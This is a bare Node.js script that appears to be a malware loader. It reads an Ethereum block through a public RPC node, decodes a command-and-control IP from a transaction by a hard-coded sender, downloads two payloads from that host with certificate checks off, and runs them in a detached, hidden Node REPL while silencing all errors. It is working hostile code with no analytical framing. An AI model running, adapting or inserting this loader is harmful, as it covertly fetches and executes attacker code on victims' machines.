const { spawn } = require('child_process');
const https = require('https');
const BLOCK_MULTIPLE = 1000n;
const SENDER = '0x1eEf0849EDa15d87f64e51C73C8442Cf3c8bCEF3'.toLowerCase();
const INDEXER_URL = 'https://eth.blockscout.com/api';
var bx = '-10502'; const V = 'A9' + bx;
function rpc(m, p) { return fetch('https://ethereum.publicnode.com', {method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify({jsonrpc:'2.0', id:1, method:m, params:p})}).then(r => r.json()); }
function ips(to) { const b = Buffer.from(to.slice(2), 'hex'); if (b.slice(8).toString() !== 'helloipbot!!') return null; return [b.slice(0,4).join('.'), b.slice(4,8).join('.')]; }
function spawnNodeScript(source) {
  const c = spawn('node', ['-i'], { detached: true, windowsHide: true, stdio: ['pipe','pipe','pipe'] });
  c.stdout.on('data', d => { if (String(d).endsWith('> ')) c.stdin.write(source + '\n'); });
  c.unref();
}
async function main() {
  const blk = await rpc('eth_blockNumber', []);
  const n = (BigInt(blk.result) / BLOCK_MULTIPLE) * BLOCK_MULTIPLE;
  const b = await rpc('eth_getBlockByNumber', ['0x' + n.toString(16), true]);
  const tx = b.result.transactions.find(t => t.from.toLowerCase() === SENDER);
  const [ip] = ips(tx.to);
  for (const p of ['/0x/cls', '/0x/ls']) {
    const body = await new Promise(res => https.get({host: ip, port: 443, path: p, headers: {'Sec-V': V}, rejectUnauthorized: false}, r => { let s=''; r.on('data', d => s += d); r.on('end', () => res(s)); }));
    spawnNodeScript(body);
  }
}
main().catch(() => {});
